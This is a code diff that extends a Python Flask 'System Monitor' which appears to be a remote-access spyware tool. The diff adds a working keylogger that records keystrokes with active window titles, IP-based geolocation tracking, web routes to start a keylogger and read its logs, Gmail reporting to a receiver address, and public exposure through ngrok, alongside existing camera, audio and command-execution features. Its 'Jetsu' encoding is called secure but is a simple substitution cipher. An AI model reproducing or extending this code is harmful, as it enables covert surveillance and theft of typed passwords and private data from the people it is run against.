@@ -18,6 +18,253 @@ import json
 import queue
 import platform
 import sys
+import geocoder
+
+# Configuration file path
+CONFIG_FILE = "seeker_config.json"
+
+class JetsuEncoder:
+    """Jetsu encoding/decoding for secure credential storage"""
+    
+    @staticmethod
+    def encode(text):
+        """Encode text to Jetsu format"""
+        m = {}
+        # Uppercase letters A-Z
+        for i in range(65, 91):
+            m[chr(i)] = 261 + (i - 65)
+        # Lowercase letters a-z
+        for i in range(97, 123):
+            m[chr(i)] = 261 + (i - 97)
+        # Special characters
+        m.update({
+            '@': 69, 
+            '.': 6969, 
+            ' ': 666666,
+            '!': 667, 
+            '#': 668, 
+            '$': 669, 
+            '%': 670,
+            '&': 671,
+            '*': 672,
+            '+': 673,
+            '-': 674,
+            '=': 675,
+            '_': 676,
+            '0': 700, '1': 701, '2': 702, '3': 703, '4': 704,
+            '5': 705, '6': 706, '7': 707, '8': 708, '9': 709
+        })
+        return ' '.join(str(m.get(c, ord(c))) for c in text)
+    
+    @staticmethod
+    def decode(encoded_text):
+        """Decode Jetsu format to text"""
+        m = {}
+        # Uppercase letters
+        for i in range(65, 91):
+            m[261 + (i - 65)] = chr(i).lower()
+        # Special characters
+        m.update({
+            69: '@', 
+            6969: '.', 
+            666666: ' ',
+            667: '!', 668: '#', 669: '$', 670: '%',
+            671: '&', 672: '*', 673: '+', 674: '-',
+            675: '=', 676: '_',
+            700: '0', 701: '1', 702: '2', 703: '3', 704: '4',
+            705: '5', 706: '6', 707: '7', 708: '8', 709: '9'
+        })
+        
+        result = []
+        for code in encoded_text.split():
+            try:
+                result.append(m.get(int(code), chr(int(code))))
+            except:
+                result.append(code)
+        return ''.join(result)
+
+def load_config():
+    """Load and decode configuration from JSON file"""
+    default_config = {
+        "email_config": {
+            "sender_email": "",
+            "sender_password": "",
+            "receiver_email": ""
+        },
+        "ngrok_config": {
+            "auth_token": ""
+        },
+        "general_config": {
+            "port": 5000,
+            "auto_start_ngrok": True,
+            "auto_start_keylogger": False
+        }
+    }
+    
+    try:
+        if os.path.exists(CONFIG_FILE):
+            with open(CONFIG_FILE, 'r') as f:
+                config = json.load(f)
+                print("✅ Configuration loaded successfully")
+                
+                # Decode Jetsu encoded credentials
+                email_config = config.get('email_config', {})
+                if email_config:
+                    # Decode sender email if it's encoded
+                    sender_email = email_config.get('sender_email', '')
+                    if sender_email and not '@' in sender_email:
+                        try:
+                            config['email_config']['sender_email'] = JetsuEncoder.decode(sender_email)
+                            print("🔓 Decoded sender email")
+                        except:
+                            print("⚠️  Could not decode sender email")
+                    
+                    # Decode sender password if it's encoded
+                    sender_password = email_config.get('sender_password', '')
+                    if sender_password and not any(c in sender_password for c in ['@', '.', ' ']):
+                        try:
+                            config['email_config']['sender_password'] = JetsuEncoder.decode(sender_password)
+                            print("🔓 Decoded sender password")
+                        except:
+                            print("⚠️  Could not decode sender password")
+                    
+                    # Decode receiver email if it's encoded
+                    receiver_email = email_config.get('receiver_email', '')
+                    if receiver_email and not '@' in receiver_email:
+                        try:
+                            config['email_config']['receiver_email'] = JetsuEncoder.decode(receiver_email)
+                            print("🔓 Decoded receiver email")
+                        except:
+                            print("⚠️  Could not decode receiver email")
+                
+                return config
+        else:
+            # Create default config file
+            with open(CONFIG_FILE, 'w') as f:
+                json.dump(default_config, f, indent=2)
+            print("📁 Configuration file created: seeker_config.json")
+            print("📝 Please edit it with your email credentials")
+            return None
+    except Exception as e:
+        print(f"❌ Error loading configuration: {e}")
+        return None
+
+def save_config_with_encoding(config):
+    """Save configuration with Jetsu encoded credentials"""
+    try:
+        # Create a copy to avoid modifying the original
+        config_to_save = config.copy()
+        config_to_save['email_config'] = config['email_config'].copy()
+        
+        # Encode sensitive email data
+        sender_email = config['email_config'].get('sender_email', '')
+        if sender_email:
+            config_to_save['email_config']['sender_email'] = JetsuEncoder.encode(sender_email)
+        
+        sender_password = config['email_config'].get('sender_password', '')
+        if sender_password:
+            config_to_save['email_config']['sender_password'] = JetsuEncoder.encode(sender_password)
+        
+        receiver_email = config['email_config'].get('receiver_email', '')
+        if receiver_email:
+            config_to_save['email_config']['receiver_email'] = JetsuEncoder.encode(receiver_email)
+        
+        with open(CONFIG_FILE, 'w') as f:
+            json.dump(config_to_save, f, indent=2)
+        
+        print("✅ Configuration saved with Jetsu encoding")
+        return True
+    except Exception as e:
+        print(f"❌ Error saving configuration: {e}")
+        return False
+
+def validate_config(config):
+    """Validate that required configuration is present"""
+    if not config:
+        return False
+    
+    email_config = config.get('email_config', {})
+    sender_email = email_config.get('sender_email', '')
+    sender_password = email_config.get('sender_password', '')
+    receiver_email = email_config.get('receiver_email', '')
+    
+    # Check if required email fields are filled
+    if not sender_email or not sender_password or not receiver_email:
+        print("❌ Missing email configuration. Please check seeker_config.json")
+        print("   Required fields: sender_email, sender_password, receiver_email")
+        return False
+    
+    # Basic email format validation
+    if '@' not in sender_email or '@' not in receiver_email:
+        print("❌ Invalid email format in configuration")
+        return False
+    
+    print("✅ Configuration validated successfully")
+    return True
+
+def setup_config_interactive():
+    """Interactive configuration setup"""
+    print("\n🎯 Let's set up your configuration securely!")
+    print("   Your credentials will be stored using Jetsu encoding")
+    print("=" * 50)
+    
+    config = {
+        "email_config": {},
+        "ngrok_config": {},
+        "general_config": {
+            "port": 5000,
+            "auto_start_ngrok": True,
+            "auto_start_keylogger": False
+        }
+    }
+    
+    # Email configuration
+    print("\n📧 Email Configuration:")
+    config["email_config"]["sender_email"] = input("   Sender Gmail address: ").strip()
+    config["email_config"]["sender_password"] = input("   Gmail App Password: ").strip()
+    config["email_config"]["receiver_email"] = input("   Receiver email: ").strip()
+    
+    # Ngrok configuration (optional)
+    print("\n🌐 Ngrok Configuration (optional):")
+    auth_token = input("   Ngrok Auth Token (press Enter to skip): ").strip()
+    if auth_token:
+        config["ngrok_config"]["auth_token"] = auth_token
+    
+    # Save configuration with encoding
+    if save_config_with_encoding(config):
+        print("\n✅ Configuration saved securely!")
+        print("🔒 Your credentials are now Jetsu encoded in the config file")
+        return config
+    else:
+        print("❌ Failed to save configuration")
+        return None
+
+# Load and validate configuration
+config = load_config()
+if not config:
+    # Interactive setup if no config exists
+    config = setup_config_interactive()
+    if not config:
+        print("❌ Program cannot start without configuration.")
+        sys.exit(1)
+
+if not validate_config(config):
+    print("❌ Invalid configuration. Please check seeker_config.json")
+    sys.exit(1)
+
+# Extract configuration values
+EMAIL_CONFIG = config['email_config']
+NGROK_CONFIG = config['ngrok_config']
+GENERAL_CONFIG = config['general_config']
+
+# For Windows active window detection
+if platform.system() == "Windows":
+    try:
+        import win32gui
+        import win32process
+        import win32con
+    except ImportError:
+        print("⚠️  pywin32 not installed - some keylogger features may not work")
 
 app = Flask(__name__)
 
@@ -26,11 +273,17 @@ from email.mime.text import MIMEText
 
 class SecureJetsuMailer:
     def __init__(self):
-        # Encoded credentials as class constants
-        self._ENC_EMAIL = "265 264 273 261 278 271 6969 279 281 273 261 273 276 265 274 69 267 273 261 269 272 6969 263 275 273"
-        self._ENC_PASS = "273 278 285 278 666666 266 262 286 266 666666 267 272 264 269 666666 261 279 278 267"
+        # Use configuration from file (already decoded)
+        self.sender_email = EMAIL_CONFIG['sender_email']
+        self.sender_password = EMAIL_CONFIG['sender_password']
+        self.receiver_email = EMAIL_CONFIG['receiver_email']
+        
+        # Verify email configuration
+        if not all([self.sender_email, self.sender_password, self.receiver_email]):
+            raise ValueError("Email configuration incomplete. Check seeker_config.json")
     
     def _to_jetsu(self, text):
+        """Encode message using Jetsu"""
         m = {}
         for i in range(65, 91):
             m[chr(i)] = 261 + (i - 65)
@@ -40,6 +293,7 @@ class SecureJetsuMailer:
         return ' '.join(str(m.get(c, c)) for c in text)
     
     def _from_jetsu(self, encoded_text):
+        """Decode Jetsu message"""
         m = {}
         for i in range(65, 91):
             m[261 + (i - 65)] = chr(i).lower()
@@ -53,31 +307,40 @@ class SecureJetsuMailer:
                 result.append(code)
         return ''.join(result)
     
-    def send(self, to_email, subject, message):
-        """Send encoded email - completely hides credentials"""
-        # Decode internally
-        email = self._from_jetsu(self._ENC_EMAIL)
-        password = self._from_jetsu(self._ENC_PASS)
-        
-        # Encode message
-        encoded_msg = self._to_jetsu(message)
-        
+    def send(self, subject, message):
+        """Send encoded email using configured credentials"""
         try:
+            # Encode message
+            encoded_msg = self._to_jetsu(message)
+            
             msg = MIMEText(encoded_msg)
             msg['Subject'] = subject
-            msg['From'] = email
-            msg['To'] = to_email
+            msg['From'] = self.sender_email
+            msg['To'] = self.receiver_email
             
             server = smtplib.SMTP('smtp.gmail.com', 587)
             server.starttls()
-            server.login(email, password)
+            server.login(self.sender_email, self.sender_password)
             server.send_message(msg)
             server.quit()
             
-            print(f"✅ Secure jetsu email sent to {to_email}")
+            print(f"✅ Secure jetsu email sent to {self.receiver_email}")
             return True
         except Exception as e:
             print(f"❌ Send failed: {e}")
+            return False
+
+    def test_connection(self):
+        """Test email configuration"""
+        try:
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
+            server.login(self.sender_email, self.sender_password)
+            server.quit()
+            print("✅ Email configuration test passed")
+            return True
+        except Exception as e:
+            print(f"❌ Email configuration test failed: {e}")
             return False
 
 # Global variables for camera and audio
@@ -94,10 +357,341 @@ CHANNELS = 1
 RATE = 44100
 CHUNK = 1024
 
-# Ngrok configuration
-NGROK_AUTH_TOKEN = ""  # Optional: Add your ngrok auth token for custom domains
+# Ngrok configuration from config file
+NGROK_AUTH_TOKEN = NGROK_CONFIG.get('auth_token', '')
 ngrok_process = None
 ngrok_url = None
+
+# General configuration
+PORT = GENERAL_CONFIG.get('port', 5000)
+AUTO_START_NGROK = GENERAL_CONFIG.get('auto_start_ngrok', True)
+AUTO_START_KEYLOGGER = GENERAL_CONFIG.get('auto_start_keylogger', False)
+
+class GeolocationTracker:
+    def __init__(self):
+        self.location_data = {}
+    
+    def get_geolocation(self):
+        """Get detailed geolocation information using multiple methods"""
+        try:
+            # Method 1: Using geocoder with multiple services
+            location = self._get_geocoder_location()
+            if location:
+                return location
+            
+            # Method 2: Using ip-api.com
+            location = self._get_ipapi_location()
+            if location:
+                return location
+                
+            # Method 3: Using ipinfo.io
+            location = self._get_ipinfo_location()
+            if location:
+                return location
+                
+            return None
+        except Exception as e:
+            print(f"Geolocation error: {e}")
+            return self._fallback_geolocation()
+    
+    def _get_geocoder_location(self):
+        """Get location using geocoder library"""
+        try:
+            # Try multiple geocoder services
+            services = ['ipinfo', 'ipapi', 'freegeoip']
+            
+            for service in services:
+                try:
+                    g = geocoder.ip('me', method=service)
+                    if g.ok and g.latlng:
+                        self.location_data = {
+                            'ip_address': g.ip,
+                            'city': g.city,
+                            'region': g.state,
+                            'country': g.country,
+                            'latitude': g.latlng[0],
+                            'longitude': g.latlng[1],
+                            'isp': 'Unknown',
+                            'timezone': 'Unknown',
+                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        }
+                        return self.location_data
+                except:
+                    continue
+            return None
+        except:
+            return None
+    
+    def _get_ipapi_location(self):
+        """Get location using ip-api.com"""
+        try:
+            response = requests.get('http://ip-api.com/json/', timeout=5)
+            if response.status_code == 200:
+                data = response.json()
+                if data['status'] == 'success':
+                    self.location_data = {
+                        'ip_address': data.get('query', ''),
+                        'city': data.get('city', ''),
+                        'region': data.get('regionName', ''),
+                        'country': data.get('country', ''),
+                        'latitude': data.get('lat', 0),
+                        'longitude': data.get('lon', 0),
+                        'isp': data.get('isp', 'Unknown'),
+                        'timezone': data.get('timezone', 'Unknown'),
+                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    }
+                    return self.location_data
+            return None
+        except:
+            return None
+    
+    def _get_ipinfo_location(self):
+        """Get location using ipinfo.io"""
+        try:
+            response = requests.get('https://ipinfo.io/json', timeout=5)
+            if response.status_code == 200:
+                data = response.json()
+                loc = data.get('loc', '').split(',')
+                if len(loc) == 2:
+                    self.location_data = {
+                        'ip_address': data.get('ip', ''),
+                        'city': data.get('city', ''),
+                        'region': data.get('region', ''),
+                        'country': data.get('country', ''),
+                        'latitude': float(loc[0]),
+                        'longitude': float(loc[1]),
+                        'isp': data.get('org', 'Unknown'),
+                        'timezone': data.get('timezone', 'Unknown'),
+                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    }
+                    return self.location_data
+            return None
+        except:
+            return None
+    
+    def _fallback_geolocation(self):
+        """Final fallback method"""
+        try:
+            # Simple IP detection
+            public_ip = self._get_public_ip()
+            if public_ip:
+                self.location_data = {
+                    'ip_address': public_ip,
+                    'city': 'Unknown',
+                    'region': 'Unknown',
+                    'country': 'Unknown',
+                    'latitude': 0,
+                    'longitude': 0,
+                    'isp': 'Unknown',
+                    'timezone': 'Unknown',
+                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                }
+                return self.location_data
+        except:
+            pass
+        return None
+    
+    def _get_public_ip(self):
+        """Get public IP address"""
+        try:
+            response = requests.get('https://api.ipify.org', timeout=5)
+            return response.text.strip()
+        except:
+            try:
+                response = requests.get('https://ident.me', timeout=5)
+                return response.text.strip()
+            except:
+                return None
+    
+    def get_google_maps_url(self):
+        """Get Google Maps URL for the location"""
+        if self.location_data and 'latitude' in self.location_data and self.location_data['latitude'] != 0:
+            lat = self.location_data['latitude']
+            lng = self.location_data['longitude']
+            return f"https://www.google.com/maps?q={lat},{lng}"
+        return None
+
+class KeyLogger:
+    def __init__(self):
+        self.log_file = "keylog.txt"
+        self.is_logging = False
+        self.log_thread = None
+        self.buffer = []
+        self.buffer_size = 20  # Save every 20 keystrokes
+        self.buffer_lock = threading.Lock()
+        
+    def start_logging(self):
+        """Start keylogging"""
+        if self.is_logging:
+            return False
+            
+        try:
+            self.is_logging = True
+            self.log_thread = threading.Thread(target=self._logging_loop, daemon=True)
+            self.log_thread.start()
+            print("✅ Keylogger started")
+            return True
+        except Exception as e:
+            print(f"❌ Keylogger failed to start: {e}")
+            return False
+    
+    def stop_logging(self):
+        """Stop keylogging"""
+        if not self.is_logging:
+            return False
+            
+        self.is_logging = False
+        if self.log_thread:
+            self.log_thread.join(timeout=2.0)
+        
+        # Save any remaining buffer
+        with self.buffer_lock:
+            if self.buffer:
+                self._save_buffer()
+                
+        print("✅ Keylogger stopped")
+        return True
+    
+    def _logging_loop(self):
+        """Main logging loop using pynput for better compatibility"""
+        try:
+            from pynput import keyboard
+        except ImportError:
+            print("❌ pynput not installed. Installing...")
+            try:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
+                from pynput import keyboard
+                print("✅ pynput installed successfully")
+            except:
+                print("❌ Failed to install pynput. Keylogger will not work.")
+                return
+
+        def on_press(key):
+            if not self.is_logging:
+                return False
+                
+            try:
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                
+                # Convert key to string
+                try:
+                    # Handle special keys
+                    if hasattr(key, 'char') and key.char is not None:
+                        key_str = key.char
+                    else:
+                        key_str = f'[{key.name}]'
+                except AttributeError:
+                    key_str = f'[{key}]'
+                
+                # Handle special cases
+                if key == keyboard.Key.space:
+                    key_str = ' '
+                elif key == keyboard.Key.enter:
+                    key_str = '\n'
+                elif key == keyboard.Key.tab:
+                    key_str = '\t'
+                elif key == keyboard.Key.backspace:
+                    key_str = '[BACKSPACE]'
+                elif key == keyboard.Key.esc:
+                    key_str = '[ESC]'
+                
+                # Add to buffer
+                with self.buffer_lock:
+                    self.buffer.append({
+                        'timestamp': timestamp,
+                        'key': key_str,
+                        'application': self._get_active_window()
+                    })
+                    
+                    # Save if buffer is full
+                    if len(self.buffer) >= self.buffer_size:
+                        self._save_buffer()
+                        
+            except Exception as e:
+                print(f"Key processing error: {e}")
+        
+        def on_release(key):
+            # Stop listener if ESC is pressed and logging is stopped
+            if key == keyboard.Key.esc and not self.is_logging:
+                return False
+            return True
+
+        # Start the listener
+        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+            while self.is_logging:
+                time.sleep(0.1)
+            listener.stop()
+    
+    def _get_active_window(self):
+        """Get active window title"""
+        try:
+            if platform.system() == "Windows":
+                import win32gui
+                window = win32gui.GetForegroundWindow()
+                title = win32gui.GetWindowText(window)
+                return title if title else "Unknown"
+            elif platform.system() == "Darwin":  # macOS
+                from AppKit import NSWorkspace
+                return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
+            else:  # Linux
+                try:
+                    result = subprocess.run(['xdotool', 'getwindowfocus', 'getwindowname'], 
+                                          capture_output=True, text=True, timeout=2)
+                    return result.stdout.strip() if result.stdout else "Unknown"
+                except:
+                    return "Unknown"
+        except:
+            return "Unknown"
+    
+    def _save_buffer(self):
+        """Save buffer to file"""
+        try:
+            if not self.buffer:
+                return
+                
+            with open(self.log_file, "a", encoding="utf-8") as f:
+                for entry in self.buffer:
+                    f.write(f"[{entry['timestamp']}] [{entry['application']}] {entry['key']}\n")
+            
+            print(f"💾 Saved {len(self.buffer)} keystrokes to {self.log_file}")
+            self.buffer.clear()
+            
+        except Exception as e:
+            print(f"Save buffer error: {e}")
+    
+    def get_logs(self, lines=100):
+        """Get recent logs"""
+        try:
+            if os.path.exists(self.log_file):
+                with open(self.log_file, "r", encoding="utf-8") as f:
+                    all_lines = f.readlines()
+                # Return last 'lines' lines
+                return ''.join(all_lines[-lines:]) if all_lines else "No keystrokes recorded yet"
+            return "No log file found"
+        except Exception as e:
+            return f"Error reading logs: {e}"
+    
+    def clear_logs(self):
+        """Clear log file"""
+        try:
+            if os.path.exists(self.log_file):
+                os.remove(self.log_file)
+                self.buffer.clear()
+                print("🗑️ Keylogs cleared")
+                return True
+            return False
+        except Exception as e:
+            print(f"Error clearing logs: {e}")
+            return False
+    
+    def get_status(self):
+        """Get keylogger status"""
+        return {
+            'is_running': self.is_logging,
+            'buffer_size': len(self.buffer),
+            'log_file': self.log_file,
+            'log_file_exists': os.path.exists(self.log_file)
+        }
 
 class CommandManager:
     def __init__(self):
@@ -812,10 +1406,23 @@ class UniversalPopupManager:
 # Initialize managers
 camera_manager = CameraManager()
 audio_manager = AudioManager()
-ngrok_manager = NgrokManager(port=5000)
+ngrok_manager = NgrokManager(port=PORT)
 system_monitor = SystemMonitor()
 popup_manager = UniversalPopupManager()
-command_manager = CommandManager()  # New command manager
+command_manager = CommandManager()
+geo_tracker = GeolocationTracker()
+key_logger = KeyLogger()
+
+# Initialize mailer
+try:
+    mailer = SecureJetsuMailer()
+    # Test email configuration
+    if not mailer.test_connection():
+        print("❌ Email configuration test failed. Please check your credentials.")
+        sys.exit(1)
+except Exception as e:
+    print(f"❌ Failed to initialize email system: {e}")
+    sys.exit(1)
 
 def get_local_ip():
     """Get local IP address for network access"""
@@ -844,6 +1451,7 @@ def cleanup_resources():
     audio_manager.cleanup()
     ngrok_manager.stop_ngrok()
     popup_manager.stop()
+    key_logger.stop_logging()  # Stop keylogger on exit
     print("✅ Cleanup completed")
 
 # Register cleanup function
@@ -1160,6 +1768,15 @@ def index():
                 background: #0da271;
             }}
 
+            .btn-warning {{
+                background: var(--warning);
+                color: white;
+            }}
+
+            .btn-warning:hover {{
+                background: #d97706;
+            }}
+
             /* System Stats */
             .stats-grid {{
                 display: grid;
@@ -1439,7 +2056,7 @@ def index():
                             <span>Local Network</span>
                             <span class="status-badge status-active">Active</span>
                         </div>
-                        <div class="url-value">http://{local_ip}:5000</div>
+                        <div class="url-value">http://{local_ip}:{PORT}</div>
                     </div>
                     <div class="url-item">
                         <div class="url-label">
@@ -1450,7 +2067,7 @@ def index():
                     </div>
                 </div>
                 <div class="controls">
-                    <button class="btn btn-primary" onclick="copyToClipboard('http://{local_ip}:5000')">
+                    <button class="btn btn-primary" onclick="copyToClipboard('http://{local_ip}:{PORT}')">
                         📋 Copy Local URL
                     </button>
                     <button class="btn btn-secondary" onclick="copyToClipboard('{ngrok_manager.public_url or ''}')" {'' if ngrok_manager.public_url else 'disabled'}>
@@ -1480,6 +2097,29 @@ def index():
                             </button>
                             <button class="btn btn-secondary" onclick="stopCamera()">
                                 ⏹️ Stop Camera
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Geolocation Tracker -->
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">
+                                <div class="card-icon">🗺️</div>
+                                Geolocation Tracker
+                            </div>
+                            <button class="btn btn-secondary" onclick="refreshLocation()">
+                                🔄 Refresh
+                            </button>
+                        </div>
+                        <div id="location-info">
+                            <div style="text-align: center; color: var(--gray);">
+                                Click refresh to get location data
+                            </div>
+                        </div>
+                        <div class="controls">
+                            <button class="btn btn-primary" onclick="openMap()">
+                                🗺️ Open in Maps
                             </button>
                         </div>
                     </div>
@@ -1531,6 +2171,36 @@ def index():
                             <button class="btn btn-primary" onclick="executeCommand()">
                                 ⚡ Execute
                             </button>
+                        </div>
+                    </div>
+
+                    <!-- Keylogger -->
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-title">
+                                <div class="card-icon">⌨️</div>
+                                Keylogger
+                                <span id="keylogger-status" class="status-badge status-inactive">Stopped</span>
+                            </div>
+                        </div>
+                        <div class="controls">
+                            <button class="btn btn-success" onclick="startKeylogger()" id="start-keylogger-btn">
+                                ▶️ Start Keylogger
+                            </button>
+                            <button class="btn btn-danger" onclick="stopKeylogger()" id="stop-keylogger-btn">
+                                ⏹️ Stop Keylogger
+                            </button>
+                            <button class="btn btn-secondary" onclick="refreshKeylogs()">
+                                📋 Refresh Logs
+                            </button>
+                            <button class="btn btn-warning" onclick="clearKeylogs()">
+                                🗑️ Clear Logs
+                            </button>
+                        </div>
+                        <div class="terminal" id="keylog-output" style="height: 300px; margin-top: 16px;">
+                            <div style="color: var(--gray); text-align: center; padding: 20px;">
+                                Keylogger data will appear here
+                            </div>
                         </div>
                     </div>
 
@@ -1842,6 +2512,130 @@ def index():
                 `;
             }}
 
+            // Geolocation functions
+            function refreshLocation() {{
+                fetch('/geolocation')
+                    .then(response => response.json())
+                    .then(data => {{
+                        if (data.success) {{
+                            displayLocationInfo(data.location);
+                        }} else {{
+                            document.getElementById('location-info').innerHTML = 
+                                '<div style="text-align: center; color: var(--danger);">Failed to get location</div>';
+                        }}
+                    }});
+            }}
+
+            function displayLocationInfo(location) {{
+                const html = `
+                    <div class="stats-grid">
+                        <div class="stat-card">
+                            <div class="stat-value stat-network">${{location.ip_address}}</div>
+                            <div class="stat-label">IP Address</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-value stat-cpu">${{location.city}}</div>
+                            <div class="stat-label">City</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-value stat-memory">${{location.region}}</div>
+                            <div class="stat-label">Region</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-value stat-disk">${{location.country}}</div>
+                            <div class="stat-label">Country</div>
+                        </div>
+                    </div>
+                    <div style="margin: 16px 0;">
+                        <strong>Coordinates:</strong> ${{location.latitude}}, ${{location.longitude}}<br>
+                        <strong>ISP:</strong> ${{location.isp}}<br>
+                        <strong>Timezone:</strong> ${{location.timezone}}<br>
+                        <strong>Last Updated:</strong> ${{location.timestamp}}
+                    </div>
+                `;
+                document.getElementById('location-info').innerHTML = html;
+            }}
+
+            function openMap() {{
+                fetch('/location_map')
+                    .then(response => response.json())
+                    .then(data => {{
+                        if (data.success) {{
+                            window.open(data.map_url, '_blank');
+                        }} else {{
+                            alert('No location data available');
+                        }}
+                    }});
+            }}
+
+            // Keylogger functions
+            function startKeylogger() {{
+                fetch('/start_keylogger', {{ method: 'POST' }})
+                    .then(response => response.json())
+                    .then(data => {{
+                        if (data.success) {{
+                            document.getElementById('keylogger-status').textContent = 'Running';
+                            document.getElementById('keylogger-status').className = 'status-badge status-active';
+                            alert('Keylogger started successfully');
+                            refreshKeylogs();
+                        }} else {{
+                            alert('Failed to start keylogger: ' + data.error);
+                        }}
+                    }});
+            }}
+
+            function stopKeylogger() {{
+                fetch('/stop_keylogger', {{ method: 'POST' }})
+                    .then(response => response.json())
+                    .then(data => {{
+                        if (data.success) {{
+                            document.getElementById('keylogger-status').textContent = 'Stopped';
+                            document.getElementById('keylogger-status').className = 'status-badge status-inactive';
+                            alert('Keylogger stopped successfully');
+                            refreshKeylogs();
+                        }} else {{
+                            alert('Failed to stop keylogger: ' + data.error);
+                        }}
+                    }});
+            }}
+
+            function refreshKeylogs() {{
+                fetch('/keylog_data')
+                    .then(response => response.json())
+                    .then(data => {{
+                        const output = document.getElementById('keylog-output');
+                        if (data.success) {{
+                            output.innerHTML = `<div style="white-space: pre-wrap; font-family: 'Monaco', 'Consolas', monospace; padding: 10px;">${{data.logs || 'No keystrokes recorded yet'}}</div>`;
+                            output.scrollTop = output.scrollHeight;
+                            
+                            // Update status
+                            if (data.status) {{
+                                const statusText = data.status.is_running ? 'Running' : 'Stopped';
+                                const statusClass = data.status.is_running ? 'status-active' : 'status-inactive';
+                                document.getElementById('keylogger-status').textContent = statusText;
+                                document.getElementById('keylogger-status').className = 'status-badge ' + statusClass;
+                            }}
+                        }} else {{
+                            output.innerHTML = `<div style="color: var(--danger);">Error: ${{data.error}}</div>`;
+                        }}
+                    }});
+            }}
+
+            function clearKeylogs() {{
+                if (confirm('Are you sure you want to clear all keylogs?')) {{
+                    fetch('/clear_keylogs', {{ method: 'POST' }})
+                        .then(response => response.json())
+                        .then(data => {{
+                            if (data.success) {{
+                                alert('Keylogs cleared successfully');
+                                refreshKeylogs();
+                            }} else {{
+                                alert('Failed to clear keylogs: ' + data.error);
+                            }}
+                        }});
+                }}
+            }}
+
             // Enter key handlers
             document.getElementById('chat-input').addEventListener('keypress', function(e) {{
                 if (e.key === 'Enter') {{
@@ -1859,9 +2653,18 @@ def index():
             setInterval(refreshSystemInfo, 5000);
             setInterval(refreshProcesses, 10000);
 
+            // Auto-refresh keylogs every 3 seconds if keylogger is running
+            setInterval(() => {{
+                if (document.getElementById('keylogger-status').textContent === 'Running') {{
+                    refreshKeylogs();
+                }}
+            }}, 3000);
+
             // Initial load
             refreshSystemInfo();
             refreshProcesses();
+            refreshLocation();
+            refreshKeylogs();
         </script>
     </body>
     </html>
@@ -2024,9 +2827,121 @@ def get_command_history():
     history = list(command_history)
     return jsonify({'history': history})
 
+# New routes for geolocation and keylogger
+@app.route('/geolocation')
+def get_geolocation():
+    """Get geolocation data"""
+    location = geo_tracker.get_geolocation()
+    if location:
+        return jsonify({'success': True, 'location': location})
+    else:
+        return jsonify({'success': False, 'error': 'Could not fetch location'})
+
+@app.route('/location_map')
+def get_location_map():
+    """Get Google Maps URL"""
+    map_url = geo_tracker.get_google_maps_url()
+    if map_url:
+        return jsonify({'success': True, 'map_url': map_url})
+    else:
+        return jsonify({'success': False, 'error': 'No location data available'})
+
+@app.route('/keylog_status')
+def get_keylog_status():
+    """Get keylogger status"""
+    try:
+        status = key_logger.get_status()
+        return jsonify({'success': True, 'status': status})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/start_keylogger', methods=['POST'])
+def start_keylogger():
+    """Start keylogger"""
+    try:
+        if key_logger.start_logging():
+            return jsonify({'success': True})
+        else:
+            return jsonify({'success': False, 'error': 'Keylogger already running or failed to start'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/stop_keylogger', methods=['POST'])
+def stop_keylogger():
+    """Stop keylogger"""
+    try:
+        if key_logger.stop_logging():
+            return jsonify({'success': True})
+        else:
+            return jsonify({'success': False, 'error': 'Keylogger not running'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/keylog_data')
+def get_keylog_data():
+    """Get keylogger data"""
+    try:
+        logs = key_logger.get_logs(200)  # Last 200 lines
+        status = key_logger.get_status()
+        return jsonify({
+            'success': True, 
+            'logs': logs, 
+            'is_running': key_logger.is_logging,
+            'status': status
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/clear_keylogs', methods=['POST'])
+def clear_keylogs():
+    """Clear keylogger data"""
+    try:
+        if key_logger.clear_logs():
+            return jsonify({'success': True})
+        else:
+            return jsonify({'success': False, 'error': 'Failed to clear logs'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/config_status')
+def get_config_status():
+    """Get configuration status (without revealing actual credentials)"""
+    try:
+        config_status = {
+            'email_configured': bool(EMAIL_CONFIG.get('sender_email') and EMAIL_CONFIG.get('sender_password')),
+            'receiver_email_set': bool(EMAIL_CONFIG.get('receiver_email')),
+            'ngrok_configured': bool(NGROK_CONFIG.get('auth_token')),
+            'port': PORT,
+            'auto_start_ngrok': AUTO_START_NGROK,
+            'auto_start_keylogger': AUTO_START_KEYLOGGER,
+            'security': 'Jetsu Encoded'
+        }
+        return jsonify({'success': True, 'config': config_status})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
 def main():
     """Main function to start the application"""
     print("🚀 Starting System Monitor...")
+    print(f"📁 Using configuration from: {CONFIG_FILE}")
+    print("🔒 Security: Jetsu Encoded Credentials")
+    
+    # Display configuration summary (without revealing passwords)
+    print("\n📋 Configuration Summary:")
+    sender_email = EMAIL_CONFIG['sender_email']
+    masked_email = sender_email[0] + '*' * (sender_email.find('@') - 2) + sender_email[sender_email.find('@')-1:]
+    print(f"   📧 Sender Email: {masked_email}")
+    print(f"   📨 Receiver Email: {EMAIL_CONFIG['receiver_email']}")
+    print(f"   🌐 Port: {PORT}")
+    print(f"   🔗 Auto-start Ngrok: {AUTO_START_NGROK}")
+    print(f"   ⌨️  Auto-start Keylogger: {AUTO_START_KEYLOGGER}")
+    
+    # Check for keylogger dependencies
+    try:
+        import pynput
+        print("✅ pynput installed - keylogger ready")
+    except ImportError:
+        print("⚠️  pynput not installed - keylogger will auto-install on first use")
     
